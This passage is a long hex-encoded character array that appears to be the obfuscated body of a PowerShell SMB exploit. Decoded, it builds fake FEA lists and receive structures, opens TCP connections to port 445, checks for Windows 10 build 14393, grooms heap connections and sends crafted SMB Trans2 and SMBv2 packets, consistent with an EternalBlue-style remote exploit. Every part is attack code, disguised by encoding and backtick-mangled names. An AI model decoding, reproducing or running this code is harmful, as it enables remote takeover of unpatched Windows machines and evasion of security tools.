,20,20 ,24 ,66, 65 ,61, '4c',69 , 73 ,74 ,'4e' , 78, 20 ,'2b' ,'3d', 20, 24 ,'6e',74 ,66 , 65 ,61,39,30 ,30,30 , 'd','a' , 20 ,20 ,20 , 20 ,24 , 66 ,65, 61 , '4c' ,69 , 73,74,'4e',78, 20,'2b' ,'3d',30 ,78 , 30 , 30 ,'2c' ,30,78,30 , 30, '2c' ,30 ,78,61,66, '2c',30 , 78,30, 30, '2b',20, 24,66 , 61, '6b',65 , 53 , 72 ,76, '4e', 65, 74 ,42, 75, 66,66 ,65 ,72, 58,36, 34, '4e', 78, 'd' , 'a', 20 , 20 , 20 ,20,24 ,66, 65, 61 ,'4c' ,69,73,74 , '4e',78, 20 , '2b' , '3d',30,78,31 ,32,'2c' , 30,78, 33, 34, '2c', 30, 78 , 37,38 , '2c', 30, 78, 35,36 ,'d' , 'a' , 20 ,20 ,20 , 20 ,'5b', 62 ,79, 74 , 65 ,'5b', '5d', '5d' ,24 ,66,61 ,'6b' , 65 ,'5f', 72,65 ,63,76,'5f' ,73,74, 72, 75 ,63 , 74 , '3d',40 , 28, 30, 78, 30 , 30 ,'2c' , 30, 78 ,30,30, '2c' ,30,78 ,30,30 ,'2c',30, 78 , 30 , 30 , '2c', 30,78 ,30,30, '2c' ,30,78, 30,30 , '2c' ,30,78,30 , 30, '2c' ,30 ,78, 30 ,30, '2c', 30 , 78,30 ,30 , '2c' ,30, 78 , 30, 30, '2c', 30,78 ,30,30 ,'2c' , 30 ,78 , 30 ,30,'2c' , 30 , 78 , 30 , 30 , '2c', 30,78 , 30 ,30, '2c',30 ,78,30,30,'2c' ,30, 78 , 30 , 30 ,'2c',30, 78 , 30 ,30 , '2c' , 30 , 78, 30 ,30, '2c' ,30 ,78 , 30, 30 , '2c',30 ,78 ,30,30 ,'2c',30,78, 30,30 , '2c' , 30 ,78 , 30, 30 , '2c',30 ,78, 30 , 30,'2c' , 30 , 78,30 ,30, '2c' , 30,78, 30,30 ,'2c',30 ,78, 30 ,30 , '2c', 30 , 78,30 ,30, '2c',30,78,30 ,30, '2c',30, 78 , 30 ,30, '2c' , 30 , 78,30 , 30,'2c' , 30, 78 , 30 , 30, '2c',30, 78 , 30, 30 , '2c',30 ,78,30 , 30 ,'2c', 30,78,30, 30,'2c',30, 78 , 30, 30, '2c' ,30 ,78,30 ,30 , '2c',30 ,78 , 30 ,30 ,'2c',30 , 78 ,30, 30 , '2c',30 , 78 ,30 , 30, '2c' ,30, 78 ,30 ,30, '2c',30 ,78, 30,30 , '2c' , 30, 78,30 , 30,'2c' , 30,78, 30 ,30 ,'2c' ,30 ,78 ,30 ,30 , '2c' , 30 ,78,30 , 30, '2c' ,30, 78,30 , 30 ,'2c', 30 ,78,30,30,'2c', 30 ,78 ,30 ,30 ,'2c', 30 ,78, 30 ,30 ,'2c' ,30 ,78, 30 ,30 , '2c', 30 ,78,30, 30 , '2c', 30, 78, 30,30 , '2c', 30,78 ,30,30, '2c' ,30,78, 30 , 30,'2c' , 30 , 78 ,30, 30,'2c' ,30 , 78 , 30 , 30 , '2c', 30 ,78 ,30 , 30 ,'2c',30 ,78,30,30, '2c',30, 78 ,30 , 30 ,'2c' , 30, 78,30 , 30 , '2c' , 30,78,30 , 30,'2c', 30 , 78 ,30 , 30,'2c',30 ,78 , 30, 30, '2c' ,30 , 78 , 30, 30 ,'2c' ,30 , 78,30 , 30, '2c', 30 , 78 ,30 ,30 , '2c',30, 78 ,30 , 30 , '2c' ,30 ,78,30 , 30 , '2c',30 ,78,30,30,'2c' , 30, 78 , 30 , 30,'2c',30 ,78 ,30 ,30 , '2c', 30 , 78 , 30,30, '2c' , 30,78 ,30 , 30,'2c' , 30 ,78 ,30 ,30 , '2c', 30, 78 , 30,30 , '2c',30,78 ,30, 30 ,'2c', 30, 78 ,30,30, '2c' , 30, 78 ,30 , 30 , '2c', 30, 78 ,30,30 ,'2c', 30 , 78 ,30 ,30 ,'2c',30 ,78 ,30, 30 , '2c' ,30,78 , 30, 30, '2c' ,30,78, 30 , 30 , '2c' ,30, 78 , 30 , 30 ,'2c', 30 ,78 ,30 ,30 , '2c', 30 , 78 ,30 ,30,'2c',30,78 ,30,30,'2c' ,30 , 78 ,30 ,30,'2c',30 , 78,35 , 38, '2c', 30,78 ,34 ,30,'2c',30,78,64,30, '2c',30, 78 ,66 , 66, '2c' , 30 ,78,66, 66 ,'2c', 30,78,66,66, '2c' ,30, 78,66, 66 ,'2c', 30,78 ,66 ,66 ,'2c',30 , 78 , 35,38 ,'2c' , 30, 78 ,34, 30 , '2c' ,30 , 78,64,30 ,'2c', 30, 78, 66 ,66,'2c', 30 , 78 , 66 , 66,'2c', 30,78 ,66 ,66,'2c' ,30 ,78 , 66, 66 ,'2c',30 ,78 ,66, 66 , '2c' ,30 ,78 , 30 , 30,'2c',30 ,78 ,30, 30 ,'2c', 30 , 78,30,30, '2c' , 30, 78, 30,30, '2c' , 30,78 ,30, 30,'2c' , 30, 78 ,30 , 30 ,'2c' ,30,78 , 30 ,30 ,'2c',30, 78 , 30,30,'2c', 30 ,78 , 30,30,'2c' , 30 ,78,30 , 30,'2c' , 30, 78, 30,30 , '2c' ,30 , 78,30 ,30,'2c', 30 , 78, 30 , 30,'2c',30 ,78, 30 , 30 ,'2c',30 , 78,30,30 ,'2c' ,30 ,78 ,30, 30 ,'2c' , 30, 78,30, 30 ,'2c' , 30, 78, 30,30,'2c' ,30, 78 ,30 , 30 , '2c' , 30,78 , 30 , 30 ,'2c', 30,78 ,30, 30,'2c' , 30, 78, 30 ,30, '2c',30 ,78 ,30, 30,'2c' , 30,78,30,30,'2c', 30 , 78 ,30,30, '2c' , 30, 78 , 30 , 30 ,'2c', 30,78 , 30,30, '2c',30 ,78 ,30, 30, '2c',30 ,78,30,30, '2c' ,30 , 78 , 30 ,30, '2c' ,30 , 78 ,30, 30 ,'2c',30 ,78 ,30 ,30, '2c' ,30 , 78 ,30 ,30, '2c' ,30, 78, 30,30 , '2c', 30, 78, 30 ,30,'2c',30 ,78 , 30, 30 ,'2c' ,30 ,78,30,30,'2c' , 30,78,30,30 , '2c' , 30,78, 30 , 30 ,'2c' , 30,78, 30 ,30,'2c', 30, 78,30,30 , '2c',30 ,78, 30 , 30, '2c' ,30,78, 30 , 30 ,'2c',30 ,78, 30, 30 , '2c' , 30 ,78, 30 , 30, '2c', 30, 78, 30 ,30 ,'2c', 30, 78, 30, 30, '2c' , 30, 78 ,30, 30 , '2c', 30, 78, 30 , 30, '2c' ,30,78 , 30 ,30, '2c', 30 , 78,30 , 30,'2c' , 30 , 78,30,30 , '2c' ,30, 78 , 30 , 30 ,'2c' ,30,78 , 30, 30, '2c' ,30, 78, 30,30, '2c', 30,78, 30,30,'2c', 30, 78,30 , 30, '2c' , 30 , 78, 30 ,30,'2c' , 30 , 78 , 30 , 30 ,'2c' , 30 , 78 ,30 , 30,'2c' ,30,78 , 30, 30,'2c', 30, 78,30, 30,'2c' ,30, 78 , 30,30 ,'2c', 30 , 78, 30 ,30 ,'2c',30,78,30, 30 , '2c', 30, 78, 30,30, '2c', 30, 78 ,30 ,30 , '2c', 30 ,78 , 30 , 30,'2c' , 30,78,30, 30 ,'2c' , 30 ,78 , 30 ,30,'2c' , 30, 78 , 30 ,30 , '2c' , 30, 78, 30 , 30 , '2c',30,78 , 30 ,30,'2c',30 ,78 , 30,30,'2c' , 30 , 78 ,30 ,30 , '2c' ,30 , 78 ,30,30,'2c' , 30,78 ,30,30,'2c', 30, 78 , 30, 30 ,'2c' , 30 ,78, 30 , 30 ,'2c' ,30, 78 , 30 , 30 , '2c' , 30 ,78 , 30, 30 , '2c',30 ,78,30,30, '2c' , 30 ,78 ,30,30 ,'2c' ,30,78 ,30 ,30, '2c' , 30,78 , 30,30 , '2c',30,78 ,30 ,30,'2c', 30, 78 ,30 ,30 ,'2c', 30, 78,30, 30,'2c' , 30,78, 30 , 30 ,'2c' ,30 , 78,30,30,'2c', 30 ,78, 30 , 30 ,'2c' , 30 , 78 ,30 ,30,'2c', 30 , 78, 30 , 30, '2c' ,30 , 78 ,30 , 30,'2c' , 30, 78,30 , 30 , '2c',30, 78,30,30 , '2c',30,78 ,30 , 30, '2c',30 , 78 ,30 ,30,'2c',30 ,78, 30,30, '2c',30, 78 ,30,30 ,'2c' ,30, 78, 30 ,30,'2c' ,30,78 ,30 ,30,'2c' ,30, 78, 30 ,30, '2c',30, 78 , 30 , 30 , '2c' , 30,78, 30,30, '2c' ,30 ,78 , 30 , 30 , '2c', 30,78, 30 ,30, '2c' , 30 ,78 ,30,30,'2c',30,78, 30 , 30, '2c', 30, 78, 30, 30, '2c' , 30 ,78 , 30, 30 , '2c' ,30 , 78 , 30 ,30 , '2c' , 30 , 78 , 30, 30,'2c' ,30,78 ,30 ,30,'2c', 30, 78 , 30,30 , '2c', 30, 78,30,30 , '2c' ,30 ,78,30,30 ,'2c', 30, 78,30, 30 , '2c' ,30 ,78 ,30 , 30,'2c', 30,78 , 30, 30 , '2c', 30, 78 , 30 ,30, '2c',30 , 78 , 30 , 30, '2c' , 30 , 78 , 30 ,30,'2c', 30 , 78 ,30 , 30 ,'2c' , 30, 78,30, 30 , '2c' , 30,78, 30,30,'2c', 30 ,78 , 30 , 30 ,'2c' , 30 , 78, 30, 30 , '2c',30 ,78,30 , 30 ,'2c', 30 ,78,30, 30 , '2c',30, 78 ,30 , 30, '2c' ,30, 78,30,30, '2c', 30 ,78, 30 ,30,'2c' ,30 , 78, 30 ,30 , '2c',30, 78 ,30 ,30, '2c' ,30, 78, 30, 30 , '2c' , 30 , 78 ,30 , 30,'2c' ,30,78,30,30, '2c' ,30 , 78,30, 30,'2c' ,30, 78,30,30 ,'2c',30,78,30 ,30 , '2c' , 30 ,78, 30 , 30,'2c',30,78,30, 30 , '2c' , 30 , 78 ,30 ,30 ,'2c' ,30,78 ,30,30,'2c', 30 , 78,30, 30, '2c',30 ,78 , 30 , 30, '2c' , 30,78, 30, 30,'2c' , 30,78, 30, 30 , '2c' ,30, 78 , 30, 30 ,'2c' ,30, 78, 30 , 30,'2c' , 30 ,78, 30 ,30 ,'2c' , 30,78,30 ,30,'2c', 30, 78 , 30 ,30, '2c' ,30 , 78, 30,30, '2c' , 30 , 78 ,30 , 30 , '2c', 30 ,78, 30,30 ,'2c' , 30 ,78, 30, 30, '2c', 30, 78 , 30 ,30 ,'2c' ,30,78 , 30 , 30, '2c' , 30,78, 30, 30 ,'2c' ,30,78,30, 30 , '2c' ,30, 78 , 30 , 30,'2c',30,78 ,30,30, '2c',30 ,78 ,30,30 ,'2c' , 30 ,78 , 30,30,'2c',30 , 78,30 ,30,'2c' ,30 , 78 ,30, 30 , '2c', 30,78,37 , 30 ,'2c', 30, 78,34 , 31 , '2c',30,78 ,64 ,30 ,'2c', 30, 78 , 66 ,66, '2c' , 30 ,78,66,66 , '2c' , 30,78, 66,66, '2c', 30,78,66 ,66 , '2c', 30 ,78 , 66,66, '2c',30 ,78 , 30, 30,'2c', 30,78,30,30,'2c',30 , 78 , 30 , 30,'2c' , 30 , 78, 30 , 30 ,'2c',30,78,30 , 30, '2c' ,30 , 78,30,30, '2c', 30 , 78 , 30, 30 ,'2c',30 , 78 ,30 ,30 ,'2c', 30, 78, 62, 30, '2c', 30,78, 37 ,65 ,'2c' ,30 , 78 , 66 ,66 ,'2c', 30,78 , 66 ,66, '2c', 30 , 78, 66 , 66, '2c' , 30 , 78 , 66,66, '2c' , 30,78 ,66 ,66 , '2c', 30,78 , 66 , 66 ,'2c',30 ,78,30 , 30, '2c',30, 78, 30,30,'2c' ,30, 78 , 30, 30 , '2c',30,78 ,30 ,30,'2c' ,30 ,78 , 30,30 , '2c', 30 , 78 , 30,30 ,'2c' , 30, 78 ,30 ,30,'2c' ,30 , 78, 30 ,30 ,'2c' ,30,78,30 , 30 , '2c' ,30,78 ,30, 30 , '2c',30, 78 , 30 , 30 ,'2c', 30 , 78 , 30,30, '2c',30,78,30, 30, '2c' , 30,78, 30,30 , '2c' , 30 , 78, 30,30,'2c',30 ,78,30,30 , '2c' ,30 ,78 , 30 , 30 ,'2c' ,30 ,78,30, 30, '2c',30, 78, 30 ,30 , '2c',30 ,78 ,30 , 30 ,'2c',30, 78, 30 ,33 , '2c' , 30,78 , 30 ,30,'2c' ,30,78, 30 ,30 , '2c' , 30, 78 ,30, 30 ,'2c',30,78 ,30,30,'2c' ,30, 78,30, 30 ,'2c' , 30 , 78 ,30, 30 , '2c', 30 , 78, 30 ,30, '2c',30 , 78 , 30 , 30,'2c',30, 78 , 30 , 30,'2c', 30,78 , 30 ,30,'2c',30 ,78,30 ,30,'2c' ,30 , 78 , 30, 30,'2c' , 30,78 , 30, 30,'2c' , 30 ,78, 30,30,'2c', 30, 78,30, 30 , '2c', 30,78,30 ,30,'2c' ,30 ,78, 30 , 30 ,'2c' ,30 ,78,30 , 30,'2c',30, 78 ,30 , 30 , '2c', 30,78,30,30, '2c' ,30 ,78,30 , 30 , '2c' ,30 ,78,30 ,30 , '2c', 30 , 78, 30, 30 ,'2c' ,30,78, 30, 30, '2c' , 30 ,78, 30 ,30 , '2c' ,30, 78, 30 ,30 ,'2c',30, 78 ,30 , 30,'2c' , 30, 78,30 ,30,'2c',30, 78,30 ,30,'2c' , 30 ,78,30 ,30 ,'2c' , 30,78, 30,30,'2c' , 30,78,30, 30 , '2c' ,30 , 78 ,30 , 30, '2c',30 , 78 ,30,30, '2c',30 , 78, 30 , 30 ,'2c' ,30, 78 , 30,30 ,'2c', 30 , 78 ,30 ,30, '2c' ,30 , 78 , 30, 30 ,'2c', 30 ,78 ,30, 30 ,'2c' , 30 , 78,30 ,30, '2c', 30, 78 , 30,30 ,'2c', 30,78 , 30,30, '2c' ,30 , 78,30 ,30 , '2c',30 , 78 , 30, 30,'2c' , 30,78 ,30,30 , '2c', 30, 78 ,30 ,30 , '2c' , 30 ,78 ,30,30 ,'2c' ,30, 78 ,30, 30 , '2c',30 , 78,30 , 30, '2c' , 30, 78,30,30 , '2c' , 30, 78, 30,30,'2c', 30,78, 30 , 30 ,'2c' , 30 , 78 ,30 ,30 ,'2c',30 , 78 ,30,30,'2c',30 ,78 , 30,30 ,'2c', 30,78 ,30 , 30 , '2c',30 , 78, 30,30 , '2c', 30, 78 ,30,30,'2c' , 30, 78,30,30 ,'2c' , 30 , 78,38,30,'2c' , 30,78 ,34,31, '2c' ,30 ,78 , 64 , 30 ,'2c', 30 ,78,66 ,66 , '2c' , 30 ,78,66,66 , '2c',30,78, 66 , 66, '2c' ,30, 78 ,66,66 , '2c',30,78, 66, 66,29, 'd' , 'a' , 20 ,20 ,20,20, 24, 66,65 , 61 ,'4c' ,69 ,73, 74, 20 , '3d' ,20 , 63 , 72 , 65,61,60 ,54 , 60,45 , 66,45,41,'6c' , 69,53 , 54,38, 20 , 24,73 , 63, '2e' , '6c' ,65,'6e',67 , 74 ,68 , 20,20 ,24, '6e' ,74,66, 65 , 61, 39,30, 30 , 30,'d' , 'a' ,'d','a', 20,20 ,20, 20 , 24 ,63 , '6c' ,69, 65 ,'6e',74,20 ,'3d',20,'4e',45,77 , '2d' , '4f' ,62,'6a' , 60 ,65 ,60 ,43, 54,20, 53,79,73, 74,65,'6d' ,'2e', '4e', 65 , 74, '2e',53 , '6f',63, '6b', 65, 74 , 73, '2e',54 ,63 , 70 ,43, '6c', 69 , 65 , '6e', 74 , 28 ,24, 74 , 61, 72 , 67,65, 74 , '2c', 34 ,34, 35 ,29 , 'd','a',20 ,20 , 20,20, 24 , 73,'6f', 63, '6b' ,20 , '3d', 20 ,24,63, '6c' , 69, 65 , '6e',74, '2e' ,43, '6c' ,69, 65 , '6e' , 74, 'd' ,'a' ,20,20 , 20 , 20,43 , 60, '4c' , 49,65 , 60 ,'4e' ,74 , '5f' ,'6e' , 60 ,45, 67, '4f' ,60 , 54,49 ,60 , 41,54 ,65, 38 , 20 , 24 ,73, '6f', 63,'6b' , 20, 24 ,74,72 ,75 ,65, 20 ,'7c' , 20, '6f' ,60 , 55,74,60,'2d','6e', 55 , '4c' , '6c' , 'd' , 'a',20 ,20,20 ,20 , 24 , 72, 61,77 ,'2c' ,20 , 24 , 73, '6d' ,62 ,68,65,61 , 64 ,65,72, 20, '3d' , 20 ,53, '6d', 42,60 , 31,'5f', 60 ,'4c' ,'4f', 67 ,69 ,'6e', 38 , 20, 24, 73 , '6f',63,'6b', 'd', 'a', 20 , 20,20 ,20 , 24 ,'6f' ,73,'3d','5b' ,73 ,79,73, 74 ,65 ,'6d','2e' ,54 , 65 ,78,74 ,'2e' , 45 ,'6e' , 63 , '6f' , 64,69 ,'6e',67, '5d' , '3a' ,'3a' ,61 , 73 , 63 ,69 ,69,'2e' , 47, 65 , 74 , 53, 74 ,72,69 ,'6e' ,67 ,28 ,24 , 72 ,61, 77,'5b', 34 , 35 ,'2e','2e' ,28 ,24 , 72, 61, 77 ,'2e' , 63,'6f' ,75 ,'6e' , 74,'2d' , 31,29 ,'5d' ,29 ,'2e' , 54 , '6f' ,'4c', '6f' ,77 , 65 ,72,28 , 29 , 'd' ,'a', 9 ,69, 66,20 ,28 ,24 , '6f',73,'2e' ,63 , '6f' ,'6e' , 74,61,69,'6e' , 73, 28, 28 ,27 , 77 , 27 , '2b', 27,69 , '6e' ,64 ,'6f' ,77,73 , 20 ,27 , '2b', 27, 31 , 30 ,20 ,27 , 29,29,29 ,'d' , 'a' , 20 ,20, 20 ,20,'7b', 'd','a',20 , 20,20 ,20 ,20 ,20,20 ,20,24 ,62,'3d','5b', 69 ,'6e', 74,'5d' , 24 ,'6f',73,'2e', 73 ,70,'6c', 69,74,28 , 22, 20 ,22 ,29, '5b' , '2d' , 31 , '5d','d', 'a' , 20, 20 , 20 , 20, 20,20,20 , 20 ,69,66,20 ,28 ,24 , 62, 20, '2d' ,67 , 65 , 20, 31,34,33 , 39,33 ,29 , 20,'7b',72,65 ,74 , 75 ,72 ,'6e' , 20,24, 46 ,61 , '6c' ,73 ,65,'7d', 'd','a', 20 ,20 , 20 ,20,'7d' ,'d', 'a','d','a' ,20, 20, 20, 20 ,69,66,20 ,28, 21 ,28,28 , 24 , '6f' , 73, '2e' , 63 ,'6f', '6e', 74,61 , 69, '6e' , 73 , 28 , 28 , 27,77,69,'6e' ,64 , '6f',77,27 , '2b' ,27, 73,20,27,'2b', 27, 38 ,27 , 29 ,29 ,29 , 20,'2d' , '6f',72 , 20 , 28,24,'6f',73, '2e', 63 , '6f' ,'6e', 74 ,61 , 69 , '6e' ,73 ,28 ,28, 27,77,27 , '2b',27 ,69,'6e', 64,27 ,'2b' , 27,'6f',77,73, 27 , 29 , 29,20 , '2d' , 61 , '6e' ,64,20 , 24, '6f' , 73 , '2e' ,63 ,'6f' , '6e', 74 , 61, 69 ,'6e' , 73,28 , 28 , 27 , 32 , 30 ,31, 27 , '2b',27,32 , 27, 29,29, 29 ,29,29 , 'd','a',20, 20 ,20 , 20 , '7b' ,72 , 65, 74,75,72 ,'6e',20 ,24 ,46, 61,'6c' , 73, 65 , '7d' , 'd' , 'a' ,9 ,24,73,'6f' , 63, '6b' , '2e' ,52 , 65,63,65,69 , 76, 65 , 54 ,69,'6d' ,65,'6f' , 75,74, 20, '3d',35,30 ,30,30,'d', 'a', 20, 20,20 ,20 ,24 , 72,61 , 77, '2c' , 20, 24, 73,'6d',62, 68 , 65 ,61, 64 , 65 ,72 , 20, '3d' , 20,54,60,52 ,65,45, '5f',63 , '6f', '4e',60, '4e', 65 , 63, 54 ,60 , '5f' ,61, '6e' ,44 ,58,38,20 ,24 , 73, '6f' ,63,'6b',20, 24 ,74,61,72,67 ,65,74 , 20 , 24 , 73 , '6d' , 62 ,68 , 65,61, 64 ,65, 72,'2e' ,75, 73,65 , 72 , '5f' , 69 , 64 , 'd', 'a', 'd','a' , 'd' ,'a',20,20, 20, 20 ,24,70, 72 , '6f', 67, 72,65,73,73,20 ,'2c' ,20, 24 ,74, 69 ,'6d' ,65 , '6f' , 75, 74, '3d' , 20,53, 45 ,'6e' ,64 , '5f',62, 69,67, '5f' , 60,54, 72 , 60,41, '4e',60 ,53,32, 38,20, 24,73,'6f', 63 ,'6b', 20 , 24 , 73,'6d', 62,68, 65 , 61 ,64 ,65 ,72,20, 24, 66,65 , 61 , '4c', 69 , 73 ,74 , 20,28,24, 66 ,65, 61 ,'4c' ,69, 73 , 74 ,'2e','6c', 65 , '6e' ,67 ,74 ,68, 25,34 , 30 ,39 ,36 ,29 , 20 , 24 , 46, 61 , '6c' ,73, 65 ,'d' ,'a', 20 , 20 , 20, 20 , 69 ,66 ,20,28 , 28 , 24 ,70 ,72 ,'6f',67, 72 , 65,73, 73, 20, '2d' , 65, 71,20 ,'2d' ,31 ,29, 20,'2d' ,61 , '6e' ,64 , 20 ,28 ,24 ,74 ,69 , '6d', 65, '6f' ,75, 74, 20,'2d' , 65 , 71 , 20, '2d' ,31 , 29,29,'d','a',20 , 20 , 20 , 20, '7b', 72,65 , 74, 75,72, '6e', 20 , 24 ,66,61 , '6c',73, 65 , '7d','d' , 'a','d', 'a' ,20, 20 ,20 , 20 ,24 , 63 , '6c', 69 , 65 , '6e',74,32,20 , '3d', 20,'4e' ,65, 77 ,60 ,'2d' , '4f',60 , 42 ,'4a' , 45, 43 ,74, 20 , 53, 79, 73,74, 65, '6d', '2e' ,'4e', 65 , 74 , '2e' , 53, '6f',63 , '6b' ,65,74, 73,'2e' ,54 ,63 ,70,43 , '6c', 69,65,'6e' , 74 ,28,24,74 ,61 ,72 , 67 , 65,74,'2c', 34 , 34,35, 29 ,'d', 'a', 20, 20,20 , 20,24 , 73 ,'6f', 63, '6b' ,32, 20 ,'3d', 20 ,24, 63 ,'6c' ,69,65 , '6e', 74,32 ,'2e', 43,'6c', 69,65,'6e', 74 , 'd' ,'a' , 20 ,20 , 20, 20, 43 ,'6c',69,65 ,'4e' ,60 ,54,60,'5f' ,60 , '4e' , 65,47 , '4f',54 , 69, 41,74,65 , 38,20 , 24, 73 ,'6f',63,'6b' ,32,20,24 , 74, 72 , 75, 65,20 , '7c',20 ,'6f' ,55 , 54, '2d' , '4e' , 60 , 55,60 , '4c' , '4c' , 'd','a' ,20,20 ,20, 20 , 24 ,72 , 61 , 77 ,'2c' , 20 , 24 ,73,'6d', 62 ,68,65, 61,64 , 65, 72, '5f' , 74,20,'3d',20 , 53, 60,'4d', 62 , 60,31, '5f' ,'4c','4f', 67,60,69, '6e',38,20,24,73, '6f',63 , '6b',32 ,'d','a' ,20,20, 20 ,20, 24 ,72 ,61 , 77,'2c', 20, 24,73 , '6d' ,62,68 ,65 ,61 , 64,65,72, 32,20, '3d', 20, 54 ,60, 52 ,65 ,65 , '5f',43 , '6f', '4e' , '6e',45 ,43,54, 60, '5f', 60 ,41 ,'4e',44,78 , 38,20 , 24, 73 ,'6f', 63, '6b',32,20,24,74,61,72,67, 65 ,74, 20 , 24 , 73 , '6d' ,62, 68 , 65 , 61 , 64,65 , 72, '5f',74,'2e', 75,73,65 ,72,'5f', 69,64 ,'d' ,'a',20 , 20 ,20 , 20 , 24, 70 , 72 ,'6f',67 , 72 ,65, 73, 73 ,32 ,20 , '2c', 20,24, 74 , 69 , '6d', 65, '6f' , 75 , 74,32 ,'3d' , 20 , 73 , 45, '6e' ,60 , 64 ,60, '5f',62 ,69 , 47,'5f' ,54 ,72,60 ,41,'6e', 73, 32 ,38,20, 24,73 ,'6f', 63, '6b' , 32,20, 24 ,73 , '6d' , 62 , 68,65 , 61 ,64 ,65 , 72,32 , 20, 24 , 66 ,65 ,61,'4c', 69 ,73 ,74, '4e' ,78,20 ,28 , 24, 66 ,65 ,61 ,'4c' ,69,73 , 74 ,'2e', '6c', 65 ,'6e',67, 74,68 , 25, 34 ,30,39 ,36,29,20 , 24 ,46, 61, '6c', 73,65 ,'d','a',20,20, 20 , 20, 69 ,66,20, 28 ,28, 24, 70 , 72,'6f' , 67,72 , 65, 73 , 73, 32,20, '2d' , 65,71,20 , '2d',31, 29 , 20 , '2d' ,61 ,'6e',64, 20, 28 ,24, 74 ,69 ,'6d' ,65, '6f', 75,74,32, 20 , '2d',65, 71 , 20 , '2d',31 ,29 ,29, 'd' , 'a',20, 20, 20 , 20 , '7b',72,65 , 74 ,75 ,72,'6e', 20, 24 , 66, 61,'6c', 73 , 65 ,'7d' , 'd','a' , 'd' ,'a' , 'd', 'a' ,20 , 20 ,20 ,20,24, 61,'6c' , '6c', '6f' ,63 , 43 , '6f' , '6e' , '6e' ,20,'3d' ,20 , 63 , 60 , 52, 45, 60, 41, 54 , 45 , 53, 65, 60 , 73, 73,69,'6f' ,'4e' , 41,60 , '4c' ,'6c' , '4f' ,43 , '4e', '4f','4e',70 ,41 , 60, 67, 65 , 60,44,38, 20 , 24 ,74 , 61 , 72,67, 65,74 ,20 , 28,24 ,'4e', 54, 46 , 45 ,41,'5f', 53 , 49, '5a',45, 38 ,20, '2d' , 20, 30 , 78, 32, 30 ,31,30,29, 'd', 'a', 'd','a', 20 , 20 , 20 , 20, 20, 24, 70, 61,79,'6c' ,'6f', 61, 64 ,'5f' ,68, 64, 72,'5f', 70, '6b',74,20, '3d' ,20, '6d' , 61 ,60, '4b', 45, '5f',53 , '4d' ,60 ,42,32 , '5f' , 50 ,60 , 41,60,59 ,'6c',60 ,'6f' ,61,44 ,'5f',48 ,45,61, 44 ,45 , 60, 52, 60, 53 ,60 ,'5f', 70 ,41 ,43,'4b' , 45 ,74 , 38 ,28,24, 74 , 72,75,65, 29,'d', 'a',20 ,20,20, 20, 20 , 24, 67, 72 ,'6f','6f' , '6d' , '5f' , 73 , '6f',63 ,'6b' ,73, 20 , '3d' , 40 ,28,29 ,'d' ,'a' ,20 , 20, 20,20,20, 66,'6f' , 72,20, 28, 24 , 69 ,'3d' , 30 , '3b', 20 ,24, 69 , 20, '2d', '6c', 74 , 20 , 31 ,33, '3b',20,24, 69,'2b' ,'2b' , 29, 'd', 'a' ,20 , 20, 20, 20,20,'7b' ,'d' , 'a' , 20 , 20 , 20 , 20 ,20 , 20, 20 , 20, 24 , 63 ,'6c', 69 ,65 , '6e', 74 ,20 ,'3d' , 20, '6e', 60 , 45,57 , '2d' ,'6f', 62,60,'4a' ,65 , 63, 54,20 , 53 , 79 ,73,74, 65,'6d','2e' ,'4e' ,65 , 74 ,'2e',53 , '6f' , 63 ,'6b', 65,74,73,'2e',54,63, 70 , 43, '6c',69 , 65, '6e' , 74 ,28, 24 ,74 , 61,72, 67, 65, 74 , '2c', 34,34, 35, 29 ,'d' ,'a', 20,20,20, 20, 20 ,20 ,20 ,20,24 ,63, '6c' , 69 , 65 , '6e', 74,'2e' , '4e' , '6f', 44,65, '6c' , 61, 79 ,20 ,'3d' ,20,24,74 ,72,75 ,65 ,'d', 'a',20 ,20 ,20,20 ,20 , 20 , 20 ,20,24,67, 73 ,'6f' ,63 , '6b' ,20 , '3d', 20 , 24 ,63, '6c' , 69 , 65 ,'6e', 74,'2e', 43 ,'6c' , 69,65 , '6e' ,74 , 'd' , 'a',20,20 ,20 , 20, 20, 20 ,20, 20 ,24, 67, 72 , '6f', '6f', '6d','5f' ,73, '6f', 63 , '6b',73,20 , '2b','3d' ,20 ,24 ,67 ,73 ,'6f', 63 ,'6b','d' , 'a' ,20 ,20,20 , 20, 20 ,20 , 20 ,20,24 ,67,73 , '6f', 63 , '6b' ,'2e', 53, 65, '6e',64,28,24,70,61, 79,'6c','6f' ,61 ,64,'5f' ,68 ,64 ,72 , '5f', 70 ,'6b', 74, 29 ,20, '7c',20 , '6f' ,60 ,55,74 , '2d','6e' ,55, 60 ,'4c' ,'4c', 'd','a' , 20,20,20,20 , 20, '7d', 'd','a',20 , 20, 20 , 20,24,68, '6f' ,'6c' ,65,43, '6f','6e' ,'6e',20, '3d', 20, 43,72,65,41,74,65, 73 ,45, 73 , 53 , 60,49,60 , '6f' , '4e',41, 60 ,'6c' , 60 , '4c' , '4f',43 ,'6e' , 60 ,'6f' ,'4e',70,41,47 , 45, 64, 38 , 20, 24, 74 , 61 ,72, 67 , 65,74 ,20,28, 24 ,'4e',54,46 , 45 ,41 ,'5f',53 ,49 ,'5a' , 45, 38 , 20 ,'2d', 20,30, 78 , 31 , 30 ,29, 'd' , 'a',20,20, 20 ,20 , 24 , 61 ,'6c','6c', '6f' ,63, 43, '6f' , '6e','6e' , '2e' , 63 , '6c', '6f', 73 ,65 ,28 , 29,'d' ,'a',20 ,20,20, 20,66, '6f' ,72, 20 , 28 , 24 ,69 , '3d', 30 ,'3b' , 20 , 24 , 69, 20,'2d' ,'6c', 74 ,20 , 35 , '3b' , 20 , 24 , 69, '2b', '2b', 29,'d' , 'a', 20 ,20,20 , 20 ,20 , '7b', 'd','a' , 20 , 20 ,20 , 20,20, 20,20 ,20 ,20,24,63 , '6c',69 , 65 ,'6e',74, 20 , '3d' ,20 ,'4e',45 ,57, '2d','6f' ,60,42, '6a',60, 65 ,43,54, 20, 53 , 79 , 73, 74,65 ,'6d' ,'2e', '4e', 65, 74,'2e',53 ,'6f',63, '6b' ,65, 74, 73,'2e' , 54,63 , 70,43,'6c',69 , 65 ,'6e' ,74 ,28,24, 74 ,61 ,72,67 ,65,74, '2c',34 ,34 ,35, 29,'d' ,'a' , 20,20,20 ,20 , 20, 20,20 ,20 ,20 ,24 , 63 ,'6c' , 69,65 , '6e',74 ,'2e' , '4e' , '6f' ,44, 65 , '6c' , 61 , 79 , 20, '3d', 20 , 24, 74 ,72 ,75,65, 'd','a' , 20 ,20 , 20 , 20 ,20,20,20,20 ,20 , 24, 67 ,73, '6f' , 63 , '6b' ,20 ,'3d',20 ,24, 63,'6c' ,69 ,65,'6e',74 , '2e', 